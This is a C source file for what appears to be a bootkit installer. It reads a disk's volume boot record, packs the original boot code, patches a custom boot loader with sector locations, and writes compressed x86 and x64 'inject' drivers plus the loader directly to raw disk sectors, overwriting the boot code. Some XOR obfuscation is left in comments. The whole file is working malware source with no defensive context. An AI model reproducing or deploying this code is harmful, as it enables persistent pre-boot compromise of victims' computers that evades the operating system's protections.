#include "FlashDiskSector.h"

static ULONG __stdcall GetCodeOffset(PUCHAR pLoader)
{
	ULONG ulOffset;
	ULONG ulCount;

	ulOffset = NTFS_LDR_HEADER_SIZE;
	ulCount = NTFS_LDR_HEADER_SIZE;
	// Skipping zeroes
	while (ulCount <= BIOS_DEFAULT_SECTOR_SIZE/*uli < BIOS_DEFAULT_SECTOR_SIZE && (pLoader[uli] == 0)*/)
	{
		if (pLoader[ulCount] == OP_JMP_SHORT)
		{
			ulOffset = ulCount;
			ulOffset += pLoader[ulCount + 1] + 2;
			if (ulOffset > BIOS_DEFAULT_SECTOR_SIZE)
			{
				ulCount++;
				continue;
			}
			else
			{
				break;
			}
		}
		if (pLoader[ulCount] == OP_JMP_NEAR)
		{
			ulOffset = ulCount;
			ulOffset += *(PUSHORT)&pLoader[ulCount + 1] + 3;
			if (ulOffset > BIOS_DEFAULT_SECTOR_SIZE)
			{
				ulCount++;
				continue;
			}
			else
			{
				break;
			}
		}
		ulCount += 1;
	}
	return ulOffset;
}
ULONG __stdcall ApPack(PCHAR SrcBuffer,ULONG SrcLen,PCHAR* pDstBuffer)
{
	ULONG wLen,pLen,PackedLen = 0;
	PCHAR Packed = NULL,WorkSet = NULL;

	wLen = aP_workmem_size(SrcLen);
	pLen = aP_max_packed_size(SrcLen);

	do 
	{
		Packed = VirtualAlloc(NULL, \
			wLen + pLen, \
			MEM_COMMIT | MEM_RESERVE, \
			PAGE_READWRITE);
	} while (NULL == Packed);
	RtlZeroMemory(Packed,pLen);

	WorkSet = Packed + pLen;
	if (PackedLen = aP_pack(SrcBuffer,Packed,SrcLen,WorkSet,NULL,NULL))
	{
		*pDstBuffer = Packed;
	}
	else
	{
		VirtualFree(Packed,0,MEM_RELEASE);
	}
	return PackedLen;
}
BOOLEAN MakeLoader(PCHAR pBootLoader,\
				   ULONG ulBootSize, \
				   PCHAR pCompressDat, \
				   ULONG ulCompressSize, \
				   PCHAR *pPacked, \
				   ULONG *ulPackedSize, \
				   PCHSS pTargetChssAddr)
{
	BOOLEAN bRet;
	ULONG uli;
	//ULONG ulC;
	//USHORT XorValue;
	ULONG ulCount;

	bRet = FALSE;
	ulCount = 0;
	*pPacked = NULL;

	if (*ulPackedSize = ApPack(pCompressDat,ulCompressSize,pPacked))
	{
		if (ulBootSize)
		{
			for (uli = 0;uli < ulBootSize;uli++)
			{
				if (pBootLoader[uli] == (CHAR)BK_NAME_MAGIC && (*(PULONG)(&pBootLoader[uli]) == BK_NAME_MAGIC))
				{
					break;
				}
			}
			if (uli < ulBootSize)
			{
				//XorValue = *(PUSHORT)(&pOriginal[uli] + sizeof(ULONG));
				//pTargetChssAddr->ulXorValue = XorValue;

				memcpy(&pBootLoader[uli],pTargetChssAddr,sizeof(CHSS));		

				// Xoring file address and size structure
				//for (ulC = 0;ulC < (sizeof(CHSS) / 2);ulC++)
				//{
				//	*((PUSHORT)&pOriginal[uli] + ulC) ^= XorValue;
				//}
				bRet = TRUE;
			}
		}
		//VirtualFree(pPacked,0,MEM_RELEASE);
	}
	return bRet;
}
BOOLEAN GetFileDat(PCHAR pFileName,PCHAR* pDat,PULONG ulSize)
{
	BOOLEAN bRet;
	HANDLE hFile;
	ULONG ulRetBytesSize;
	LARGE_INTEGER lSize;

	bRet = FALSE;
	lSize.QuadPart = 0;

	do 
	{
		hFile = CreateFileA(pFileName, \
			FILE_READ_ACCESS, \
			FILE_SHARE_READ | FILE_SHARE_WRITE, \
			NULL, \
			OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, \
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			break;
		}
		bRet = GetFileSizeEx(hFile,&lSize);
		if (FALSE == bRet)
		{
			break;
		}
		*pDat = VirtualAlloc(NULL,lSize.LowPart,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
		if (NULL == *pDat)
		{
			break;
		}
		RtlZeroMemory(*pDat,lSize.LowPart);
		*ulSize = lSize.LowPart;
		bRet = ReadFile(hFile,*pDat,lSize.LowPart,&ulRetBytesSize,NULL);
		if (FALSE == bRet)
		{
			break;
		}
		bRet = TRUE;
	} while (0);
	if (hFile)
	{
		CloseHandle(hFile);
	}
	return bRet;
}
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PCHAR pCmdLine,int nCmdShow)
{
	HANDLE hDisk;
	HANDLE hVbr;
	PCHAR pVbrDat;
	PCHAR pBootCode;
	PCHAR pPacked;
	ULONG ulPackedSize;
	ULONG ulVbrSize;
	ULONG ulBootCodeSize;
	ULONG ulRetBytesSize;
	CHSS BkChss;
	CHSS NewChss;
	ULONG ulError;
	LDRDRV x86LdrCode;
	LDRDRV x64LdrCode;
	PCHAR pInjectX86Code;
	PCHAR pInjectX64Code;
	PCHAR pCompressedDat;
	ULONG ulX86CodeSize;
	ULONG ulX64CodeSize;
	ULONG ulTotalSize;
	PCHAR pSysDat;
	ULONG ulSize;
	ULONG uli;
	ULONG ulXored;
	ULONG ulOffset;
	ULONG ulCompressedDatSize;
	CHAR ShowMsgA[MAX_PATH];

	pVbrDat = NULL;
	pBootCode = NULL;
	ulVbrSize = 0;
	ulBootCodeSize = 0;
	ulRetBytesSize = 0;
	ulError = 0;
	pInjectX86Code = NULL;
	pInjectX64Code = NULL;
	ulX86CodeSize = 0;
	ulX86CodeSize = 0;
	ulTotalSize = 0;
	pSysDat = NULL;
	ulSize = 0;
	ulXored = 0;
	ulOffset = 0;
	pPacked = NULL;
	ulPackedSize = 0;
	pCompressedDat = NULL;
	ulCompressedDatSize = 0;
	RtlZeroMemory(ShowMsgA,sizeof(CHAR) * MAX_PATH);


	switch (__argc)
	{
	case 6:
		if (GetFileDat(__argv[4],&pInjectX86Code,&ulX86CodeSize) && \
			GetFileDat(__argv[5],&pInjectX64Code,&ulX64CodeSize))
		{
			ulTotalSize = sizeof(LDRDRV) * 3 + ulX86CodeSize + ulX64CodeSize;
			if (ulTotalSize % 0x400)
			{
				ulTotalSize = ((ulTotalSize / 0x400) + 1) * 0x400;
			}
			do 
			{
				pSysDat = VirtualAlloc(NULL,ulTotalSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pSysDat);
			RtlZeroMemory(pSysDat,ulTotalSize);

			x86LdrCode.ulSignature = 'XD86';
			x86LdrCode.ulLength = ulX86CodeSize;
			x86LdrCode.ulOffset = sizeof(LDRDRV) * 3;
			x86LdrCode.ulXor = 0;

			x64LdrCode.ulSignature = 'XD64';
			x64LdrCode.ulLength = ulX64CodeSize;
			x64LdrCode.ulOffset = sizeof(LDRDRV) * 3 + ulX86CodeSize;
			x64LdrCode.ulXor = 0;

			RtlCopyMemory(pSysDat,&x86LdrCode,sizeof(LDRDRV));
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV)),&x64LdrCode,sizeof(LDRDRV));

			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3),pInjectX86Code,ulX86CodeSize);
			RtlCopyMemory((PCHAR)((ULONG)pSysDat + sizeof(LDRDRV) * 3 + ulX86CodeSize),pInjectX64Code,ulX64CodeSize);

		}
		if (GetFileDat(__argv[2],&pBootCode,&ulBootCodeSize))
		{
			hVbr = CreateFileA(__argv[3], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hVbr)
			{
				return 0;
			}
			ulVbrSize = 0x2000;
			do 
			{
				pVbrDat = VirtualAlloc(NULL,ulVbrSize,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
			} while (NULL == pVbrDat);
			RtlZeroMemory(pVbrDat,ulVbrSize);
			if (FALSE == ReadFile(hVbr,pVbrDat,ulVbrSize,&ulRetBytesSize,NULL))
			{
				ulError = GetLastError();
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Read Vbr Failed.ErrorCode:%08x\r\r",ulError);
				OutputDebugStringA(ShowMsgA);
			}
			ulOffset = GetCodeOffset((PUCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE));
			SetFilePointer(hVbr,ulOffset + BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			RtlZeroMemory(&BkChss,sizeof(CHSS));

			if (!MakeLoader(pBootCode, \
				ulBootCodeSize, \
				(PCHAR)((ULONG)pVbrDat + BIOS_DEFAULT_SECTOR_SIZE + ulOffset), \
				ulVbrSize - BIOS_DEFAULT_SECTOR_SIZE - ulOffset, \
				&pPacked, \
				&ulPackedSize, \
				&BkChss))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"MakeLoader() Failed.");
				OutputDebugStringA(ShowMsgA);
			}
			hDisk = CreateFileA(__argv[1], \
				FILE_ALL_ACCESS, \
				FILE_SHARE_READ, \
				NULL, \
				OPEN_EXISTING, \
				FILE_ATTRIBUTE_NORMAL, \
				NULL);
			if (INVALID_HANDLE_VALUE == hDisk)
			{
				return 0;
			}
			//ulSize = ulTotalSize / sizeof(ULONG);
			//for (uli = 0;uli < (ulTotalSize / sizeof(ULONG));uli++)
			//{
			//	ulXored = ((PULONG)pSysDat)[uli];
			//	ulXored = _rotl((ulXored + ulSize) ^ BkChss.ulXorValue,ulSize);
			//	((PULONG)pSysDat)[uli] = ulXored;
			//	ulSize -= 1;
			//}
			if (ulPackedSize % 0x200)
			{
				ulPackedSize = ((ulPackedSize / 0x200) + 1) * 0x200;
			}

			ulCompressedDatSize = ApPack(pSysDat,ulTotalSize,&pCompressedDat);
			if (ulCompressedDatSize % 0x200)
			{
				ulCompressedDatSize = ((ulCompressedDatSize / 0x200) + 1) * 0x200;
			}
			BkChss.lStartSector.QuadPart = 0x0B;
			BkChss.uNumberSectors = (USHORT)(ulCompressedDatSize / 0x400);
			BkChss.ulXorValue = GetTickCount();

			for (uli = 0;uli < ulBootCodeSize;uli++)
			{
				if (pBootCode[uli] == (CHAR)0x55 && (*(PULONG)(&pBootCode[uli]) == 0x55555555))
				{
					break;
				}
			}
			NewChss.lStartSector.QuadPart = BkChss.lStartSector.QuadPart + (BkChss.uNumberSectors * 0x400 / 0x200) + 1;
			NewChss.uNumberSectors = (USHORT)ulPackedSize/0x200;
			RtlCopyMemory(pBootCode + uli,&NewChss,sizeof(CHSS));
			SetFilePointer(hDisk,BkChss.lStartSector.LowPart * BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pCompressedDat,ulCompressedDatSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",BkChss.lStartSector.LowPart);
				OutputDebugStringA(ShowMsgA);
			}
			SetFilePointer(hDisk,NewChss.lStartSector.LowPart * BIOS_DEFAULT_SECTOR_SIZE,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pPacked,ulPackedSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",NewChss.lStartSector.LowPart);
				OutputDebugStringA(ShowMsgA);
			}
			SetFilePointer(hDisk,0x800 * BIOS_DEFAULT_SECTOR_SIZE + BIOS_DEFAULT_SECTOR_SIZE + ulOffset,NULL,FILE_BEGIN);
			if (FALSE == WriteFile(hDisk,pBootCode,ulBootCodeSize,&ulRetBytesSize,NULL))
			{
				StringCchPrintfA(ShowMsgA,MAX_PATH,"Write Sector Failed,Offset:%08x",0x800 + 0x01);
				OutputDebugStringA(ShowMsgA);
			}
			if (hDisk)
			{
				CloseHandle(hDisk);
			}
			if (hVbr)
			{
				CloseHandle(hVbr);
			}
			if (pVbrDat)
			{
				VirtualFree(pVbrDat,ulVbrSize,MEM_RESERVE);
				pVbrDat = NULL;
			}
		}
		break;
	default:
		break;
	}
	return 0;
}